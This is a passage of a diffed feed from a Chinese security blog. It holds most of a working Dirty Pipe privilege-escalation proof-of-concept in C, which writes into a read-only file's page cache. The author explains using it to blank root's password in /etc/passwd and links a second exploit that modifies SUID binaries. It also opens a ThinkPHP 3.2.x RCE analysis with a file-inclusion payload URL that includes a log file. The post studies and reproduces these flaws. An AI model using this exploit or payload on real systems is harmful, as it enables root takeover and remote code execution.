+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;fprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stderr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;Sorry, cannot start writing at a page boundary&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="n"&gt;loff_t&lt;/span&gt; &lt;span class="n"&gt;next_page&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PAGE_SIZE&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="n"&gt;loff_t&lt;/span&gt; &lt;span class="n"&gt;end_offset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;loff_t&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;data_size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;end_offset&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;next_page&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;fprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stderr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;Sorry, cannot write across a page boundary&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="cm"&gt;/* open the input file and validate the specified offset */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;O_RDONLY&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// yes, read-only! :-)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fd&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;perror&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;open failed&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="nc"&gt;stat&lt;/span&gt; &lt;span class="n"&gt;st&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fstat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;st&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;perror&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;stat failed&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;st&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;st_size&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;fprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stderr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;Offset is not inside the file&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;end_offset&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;st&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;st_size&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;fprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stderr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;Sorry, cannot enlarge the file&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="cm"&gt;/* create the pipe with all flags initialized with
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; PIPE_BUF_FLAG_CAN_MERGE */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;prepare_pipe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="cm"&gt;/* splice one byte from before the specified offset into the
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; pipe; this will add a reference to the page cache, but
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; since copy_page_to_iter_pipe() does not initialize the
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; &amp;#34;flags&amp;#34;, PIPE_BUF_FLAG_CAN_MERGE is still set */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;offset&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;ssize_t&lt;/span&gt; &lt;span class="n"&gt;nbytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;splice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;offset&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;nbytes&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;perror&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;splice failed&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;nbytes&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;fprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stderr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;short splice&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="cm"&gt;/* the following write will not create a new pipe_buffer, but
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; will instead write into the page cache, because of the
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; PIPE_BUF_FLAG_CAN_MERGE flag */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;nbytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data_size&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;nbytes&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;perror&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;write failed&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;size_t&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;nbytes&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;data_size&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;fprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stderr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;short write&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;It worked!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;EXIT_SUCCESS&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这个poc比较粗糙，需要指定覆盖哪个文件，从第几个字符开始写，写入什么内容，因此我们可以将passwd中root的密码置空，然后再在描述处填充字符，达到提权的目的。&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314001553576.png"
 width="378"
 height="255"
-srcset="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314001553576_hu2118577025712955168.png 480w, https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314001553576_hu3720582596370207705.png 1024w"
+srcset="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314001553576_hu_1c8442bb6e7bad36.png 480w, https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314001553576_hu_a287e4869159bc47.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="148"
 data-flex-basis="355px"
->&lt;/p>
-&lt;h2 id="poc2">POC2
-&lt;/h2>&lt;p>另一个poc直接修改具有suid的可执行文件，然后执行这个可执行文件提权，最后再把这个文件改回来：https://haxx.in/files/dirtypipez.c&lt;/p>
-&lt;p>&lt;img src="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314002347954.png"
+&gt;&lt;/p&gt;
+&lt;h2 id="poc2"&gt;POC2
+&lt;/h2&gt;&lt;p&gt;另一个poc直接修改具有suid的可执行文件，然后执行这个可执行文件提权，最后再把这个文件改回来：https://haxx.in/files/dirtypipez.c&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314002347954.png"
 width="758"
 height="817"
-srcset="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314002347954_hu16629432693888021403.png 480w, https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314002347954_hu5529075850864984342.png 1024w"
+srcset="https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314002347954_hu_cf062b4896c52093.png 480w, https://k1te.cn/p/dirty_pipe%E5%A4%8D%E7%8E%B0/image-20220314002347954_hu_fd84e17f3d376018.png 1024w"
 loading="lazy"
 class="gallery-image"
 data-flex-grow="92"
 data-flex-basis="222px"
->&lt;/p>
-&lt;h2 id="踩坑">踩坑
-&lt;/h2>&lt;p>刚开始想在docker上复现，拉的是ubuntu:lastest，但是尝试执行&lt;code>dpkg -i linux-*.deb&lt;/code>的时候报错：&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;span class="lnt">4
-&lt;/span>&lt;span class="lnt">5
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">dpkg: dependency problems prevent configuration of linux-image-unsigned-5.8.0-050800-generic:
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> linux-image-unsigned-5.8.0-050800-generic depends on kmod; however:
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Package kmod is not installed.
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> linux-image-unsigned-5.8.0-050800-generic depends on linux-base (&amp;gt;= 4.5ubuntu1~16.04.1); however:
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Package linux-base is not installed.
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>后面尝试执行&lt;code>update-grub&lt;/code>也报错：&lt;code>/usr/sbin/grub-probe: error: failed to get canonical path of 'overlay'&lt;/code>&lt;/p>
-&lt;p>但是看p神的文章就是在docker中复现的，因为对docker没有很深的研究及理解，所以没能解决，等以后有空再填坑吧&lt;/p>
-&lt;h2 id="参考">参考
-&lt;/h2>&lt;p>&lt;a class="link" href="https://t.zsxq.com/vJ2zjaI" target="_blank" rel="noopener"
->https://t.zsxq.com/vJ2zjaI&lt;/a>&lt;/p>
-&lt;p>&lt;a class="link" href="https://dirtypipe.cm4all.com/" target="_blank" rel="noopener"
->The Dirty Pipe Vulnerability — The Dirty Pipe Vulnerability documentation (cm4all.com)&lt;/a>&lt;/p></description></item><item><title>TP3.2.xRCE</title><link>https://k1te.cn/p/tp3.2.xrce/</link><pubDate>Sat, 14 Aug 2021 16:19:19 +0800</pubDate><guid>https://k1te.cn/p/tp3.2.xrce/</guid><description>&lt;p>前段时间打比赛的时候遇到了Think PHP3.2.x RCE的题目，这个洞是上个月爆出来的：&lt;a class="link" href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ" target="_blank" rel="noopener"
->【漏洞通报】ThinkPHP3.2.x RCE漏洞通报&lt;/a>。虽然3已经不是主流版本了，但是考虑到还是有不少老的站在用，所以还是有一定的价值的，这里分析一下。&lt;/p>
-&lt;h2 id="利用">利用
-&lt;/h2>&lt;p>这里用的是Think PHP3.2.5完整版，具体每个版本之间的区别可以看看参考链接&lt;/p>
-&lt;p>利用的条件是assign方法的第一个变量可控。因此我们可以在indexController写入demo：&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;span class="lnt">2
-&lt;/span>&lt;span class="lnt">3
-&lt;/span>&lt;span class="lnt">4
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="k">function&lt;/span> &lt;span class="nf">index&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">){&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">assign&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$value&lt;/span>&lt;span class="p">);&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">display&lt;/span>&lt;span class="p">();&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
-&lt;/div>
-&lt;/div>&lt;p>payload：&lt;code>?m=Home&amp;amp;c=Index&amp;amp;a=index&amp;amp;value[_filename]=.\Application\Runtime\Logs\Home\21_06_30.log&lt;/code>&lt;/p>
-&lt;p>本质上是一个文件包含，再结合报错写log最终达到rce的目的&lt;/p>
-&lt;h2 id="分析">分析
-&lt;/h2>&lt;p>这里我们先不包含log，而是包含config.ini来分析文件包含，payload：&lt;/p>
-&lt;div class="highlight">&lt;div class="chroma">
-&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
-&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
-&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
-&lt;td class="lntd">
